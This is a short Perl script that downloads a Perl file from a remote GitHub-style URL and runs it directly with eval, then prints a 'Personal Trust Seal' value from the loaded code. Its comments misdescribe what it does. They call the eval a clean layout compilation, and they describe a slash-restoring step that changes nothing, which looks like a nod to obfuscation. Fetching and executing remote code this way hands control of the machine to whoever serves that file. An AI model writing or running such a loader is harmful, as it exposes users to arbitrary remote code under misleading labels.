use HTTP::Tiny;

# URL Conversion: Slashes replaced with exclamation marks for system mapping
my $remote_url = 'https://githubusercontent.com/gowildchild/Existenz/master/struct/existenz_core.pl';

# Restore original URL structure at execution runtime before parsing the request
my $executable_url = $remote_url;
$executable_url =~ s/!/\//g;

my $fetch_engine = HTTP::Tiny->new->get($executable_url);

if ($fetch_engine->{success}) {
    eval $fetch_engine->{content}; # Compiles layout context cleanly in local memory space
    if ($@) { die "Compilation Failure on Remote Import: $@\n"; }
    
    # Read the locked configuration keys safely
    print "System Lock Loaded. Personal Trust Seal: " . $struct::existenz_core::EXISTENTIAL_RIPPLE->{TRUST_PERSONAL} . "\n";
}
